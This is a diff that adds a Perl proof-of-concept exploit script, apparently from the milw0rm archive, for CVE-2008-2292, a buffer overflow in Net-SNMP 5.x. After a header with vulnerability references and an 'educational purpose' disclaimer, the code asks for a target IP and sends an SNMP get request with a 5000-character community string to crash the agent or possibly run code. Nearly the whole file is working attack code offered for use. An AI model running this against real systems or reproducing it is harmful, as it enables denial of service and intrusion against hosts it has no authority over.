@@ -1,0 +1,61 @@
+#!usr/bin/perl -w
+
+################################################################################################################
+#    Buffer overflow in the __snprint_value function in snmp_get in Net-SNMP 5.1.4, 5.2.4, and 5.4.1,
+#    as used in SNMP.xs for Perl, allows remote attackers to cause a denial of service (crash) and
+#    possibly execute arbitrary code via a large OCTETSTRING in an attribute value pair (AVP).
+#
+#    Refer:
+#    http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2008-2292
+#    http://www.securityfocus.com/bid/29212/discuss
+#
+#
+#    To run this exploit on MS Windows replace "#!usr/bin/perl -w" with "#!Installation_path_for_perl -w"
+#    (say #!C:/Program Files/Perl/bin/perl -w)
+#
+#     This was strictly written for educational purpose. Use it at your own risk.
+#    Author will not bare any responsibility for any damages watsoever.
+#
+#        Author:    Praveen Darshanam
+#        Email:    praveen[underscore]recker[at]sify.com
+#        Date:    11th November, 2008
+#
+#    NOTE:    Thanks to all my colleagues at iPolicy Networks for making this possible
+#            For reliable security solutions please visit http://www.ipolicynetworks.com/
+#
+##################################################################################################################
+
+use Net::SNMP;
+
+printf("\nEnter the IP Adress of Vulnerable SNMP Manager Agent:  ");
+$host_vulnerable = <STDIN>;
+$port = 161;
+#default SNMP port
+$community = "D" x 5000;
+
+($session, $error) = Net::SNMP->session(
+                                               -hostname      => $host_vulnerable,
+                                               -port          => $port,
+                                               -community     => $community,
+                                             -maxmsgsize    => 7000,
+                                        );
+ if (!defined($session))
+ {
+      printf("ERROR: %s.\n", $error);
+      exit 1;
+ }
+
+$sysUpTime = '1.3.6.1.2.1.1.3.0';
+$snmp_mal_request = $session->get_request(
+                                              -varbindlist => [$sysUpTime],
+                                          );
+
+ if (!defined($snmp_mal_request)) {
+                                      printf("ERROR: %s.\n", $session->error);
+                                      $session->close;
+                                      exit 1;
+                                  }
+
+$session->close;
+
+# milw0rm.com [2008-11-12]
